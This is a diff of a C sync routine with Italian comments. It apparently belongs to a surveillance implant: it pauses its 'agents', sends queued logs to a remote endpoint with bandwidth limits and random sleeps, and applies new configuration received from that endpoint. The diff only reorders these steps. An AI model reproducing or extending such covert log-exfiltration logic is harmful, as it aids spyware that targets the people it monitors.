@@ -135,11 +135,6 @@ BOOL WINAPI DA_Syncronize(BYTE *action_param)
 		AM_SuspendRestart(AM_RESTART); // Rimette gli agent nella condizione che avevano alla suspend
 	LeaveCriticalSection(&action_critic_sec);
 
-	// Invia la coda dei log da spedire (no concorrenza con agenti)
-	// Essendo l'ultima parte del protocollo, questa funzione si occupera' anche di mandare i PROTO_BYE
-	LOG_SendLogQueue(sync_conf->band_limit, sync_conf->min_sleep, sync_conf->max_sleep);
-	LOG_CloseLogConnection();
-
 	// Modifica configurazione eventi/azioni
 	// se ha ricevuto nuovo file di conf
 	if (new_conf) {
@@ -151,8 +146,16 @@ BOOL WINAPI DA_Syncronize(BYTE *action_param)
 		EventMonitorStartAll();
 		// Ricreo il thread di gestione delle azioni fast (ora la tabella esiste di nuovo)
 		hInstantActionThread = HM_SafeCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)FastActionsThread, NULL, 0, &dummy);
-		return TRUE; // C'e' una nuova conf, quindi anche questo thread deve smettere di eseguire subactions
 	}
+
+	// Invia la coda dei log da spedire (no concorrenza con agenti)
+	// Essendo l'ultima parte del protocollo, questa funzione si occupera' anche di mandare i PROTO_BYE
+	LOG_SendLogQueue(sync_conf->band_limit, sync_conf->min_sleep, sync_conf->max_sleep);
+	LOG_CloseLogConnection();
+
+	if (new_conf)
+		return TRUE; // C'e' una nuova conf, quindi anche questo thread deve smettere di eseguire subactions
+
 	return exit_after_completion;
 }
 
